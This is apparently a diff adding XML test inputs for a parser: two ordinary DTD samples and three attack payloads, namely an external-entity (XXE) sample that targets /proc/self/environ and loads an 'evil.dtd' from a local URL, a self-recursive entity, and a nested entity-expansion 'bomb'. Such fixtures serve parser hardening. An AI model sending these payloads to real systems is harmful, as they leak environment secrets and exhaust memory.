@@ -1,0 +1,64 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ELEMENT root (child*)>
+  <!ELEMENT child (#PCDATA)>
+  <!ATTLIST child id ID #REQUIRED>
+  <!ENTITY internal "test">
+]>
+<root>
+  <child id="c1">&internal;</child>
+  <child id="c2">data</child>
+</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///proc/self/environ">
+  <!ENTITY % dtd SYSTEM "http://localhost:8080/evil.dtd">
+  %dtd;
+]>
+<data>
+  <element>test</element>
+</data>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE config [
+  <!ENTITY &#x45;xpand "expansion">
+  <!ENTITY recur "&recur;&recur;&recur;&recur;&recur;">
+]>
+<config>
+  <item>&#x45;xpand</item>
+  <recursive>&recur;</recursive>
+</config>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE mixed [
+  <!NOTATION gif PUBLIC "GIF" "image/gif">
+  <!ELEMENT mixed (unparsed|normal)*>
+  <!ELEMENT unparsed EMPTY>
+  <!ELEMENT normal (#PCDATA)>
+  <!ATTLIST unparsed data ENTITY #REQUIRED>
+  <!ENTITY img1 SYSTEM "data.gif" NDATA gif>
+]>
+<mixed>
+  <unparsed data="img1"/>
+  <normal>text</normal>
+</mixed>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE bomb [
+  <!ENTITY lv1 "x">
+  <!ENTITY lv2 "&lv1;&lv1;&lv1;&lv1;&lv1;&lv1;&lv1;&lv1;&lv1;&lv1;&lv1;&lv1;&lv1;&lv1;&lv1;&lv1;">
+  <!ENTITY lv3 "&lv2;&lv2;&lv2;&lv2;&lv2;&lv2;&lv2;&lv2;&lv2;&lv2;&lv2;&lv2;&lv2;&lv2;&lv2;&lv2;&lv2;&lv2;">
+  <!ENTITY lv4 "&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;&lv3;">
+]>
+<bomb>&lv4;</bomb>
+```
